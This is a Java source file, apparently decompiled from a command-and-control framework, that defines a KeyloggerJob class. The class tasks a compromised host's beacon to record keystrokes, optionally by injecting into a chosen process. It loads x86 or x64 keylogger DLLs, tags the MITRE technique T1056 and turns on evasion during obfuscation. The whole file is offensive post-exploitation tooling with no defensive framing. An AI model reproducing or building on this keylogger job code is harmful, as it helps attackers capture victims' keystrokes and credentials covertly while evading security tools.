package beacon.jobs;

import beacon.Job;
import beacon.TaskBeacon;
import pe.PostExObfuscator;

public class KeyloggerJob extends Job {
   public KeyloggerJob(TaskBeacon var1) {
      super(var1);
   }

   public String getDescription() {
      return this.isInject() ? "Tasked beacon to log keystrokes in " + this.pid + " (" + this.arch + ")" : "Tasked beacon to log keystrokes";
   }

   public String getShortDescription() {
      return "keystroke logger";
   }

   public String getDLLName() {
      return this.arch.equals("x64") ? "resources/keylogger.x64.dll" : "resources/keylogger.dll";
   }

   public String getPipeName() {
      return "keylogger";
   }

   public int getCallbackType() {
      return 1;
   }

   public int getWaitTime() {
      return 0;
   }

   public String getTactic() {
      return "T1056";
   }

   public void obfuscate(PostExObfuscator var1, byte[] var2) {
      var1.enableEvasions();
   }
}
